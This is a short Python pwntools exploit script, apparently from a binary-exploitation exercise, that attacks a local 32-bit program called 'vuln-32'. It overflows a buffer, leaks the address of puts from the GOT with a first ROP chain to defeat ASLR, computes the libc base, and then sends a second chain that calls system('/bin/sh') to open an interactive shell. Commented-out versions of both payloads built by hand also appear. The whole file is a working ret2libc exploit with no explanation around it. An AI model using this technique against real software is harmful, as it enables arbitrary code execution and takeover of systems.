#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

offset = 32

log.info(p.clean())

# payload = flat(
#     b'A' * offset,
#     elf.plt['puts'],
#     elf.sym['main'],
#     elf.got['puts']
# )
# 
# p.sendline(payload)

rop = ROP(elf)

rop.raw(b'A' * offset)
rop.puts(elf.got['puts'])
rop.main()

p.sendline(rop.chain())

puts_got = u32(p.recv(4))

libc.address = puts_got - libc.sym['puts']
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))

log.info(p.clean())

# payload = flat(
#     b'A' * offset,
#     system,
#     0x0,
#     binsh
# )

rop = ROP(libc)
rop.raw(b'A' * offset)
rop.system(binsh)

p.sendline(rop.chain())

p.interactive()
